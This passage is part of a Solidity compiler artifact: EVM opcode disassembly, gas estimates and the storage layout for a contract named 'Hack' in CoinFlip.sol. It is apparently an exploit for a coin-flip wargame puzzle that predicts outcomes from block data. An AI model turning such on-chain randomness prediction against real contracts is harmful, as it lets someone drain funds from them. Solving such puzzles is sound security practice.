PUSH2 0x153 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x172 DUP2 PUSH2 0x15E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x18B PUSH0 DUP4 ADD DUP5 PUSH2 0x169 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x19E DUP2 PUSH2 0x15E JUMP JUMPDEST DUP2 EQ PUSH2 0x1A8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x1B9 DUP2 PUSH2 0x195 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1D4 JUMPI PUSH2 0x1D3 PUSH2 0x191 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1E1 DUP5 DUP3 DUP6 ADD PUSH2 0x1AB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x496E636F72726563742047756573732100000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x22E PUSH1 0x10 DUP4 PUSH2 0x1EA JUMP JUMPDEST SWAP2 POP PUSH2 0x239 DUP3 PUSH2 0x1FA JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x25B DUP2 PUSH2 0x222 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x2A2 DUP3 PUSH2 0x262 JUMP JUMPDEST SWAP2 POP PUSH2 0x2AD DUP4 PUSH2 0x262 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x2C5 JUMPI PUSH2 0x2C4 PUSH2 0x26B JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x302 DUP3 PUSH2 0x262 JUMP JUMPDEST SWAP2 POP PUSH2 0x30D DUP4 PUSH2 0x262 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x31D JUMPI PUSH2 0x31C PUSH2 0x2CB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCB MCOPY CREATE2 0xB9 PUSH1 0xA7 CALLDATACOPY SWAP9 0x2D 0x1E 0xB8 0xAA 0xE9 LOG4 MUL 0xBA 0xCD ADDMOD 0xD5 BLOCKHASH 0xED 0x22 STOP 0xE0 SWAP15 0x25 PUSH1 0x97 0xCF PUSH29 0x8C8D64736F6C634300081A003300000000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "172400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"flip()": "infinite"
					},
					"internal": {
						"_guess()": "infinite"
					}
				},
				"methodIdentifiers": {
					"flip()": "cde4efa9"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 7,
						"contract": "contracts/CoinFlip.sol:Hack",
						"label": "FACTOR",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}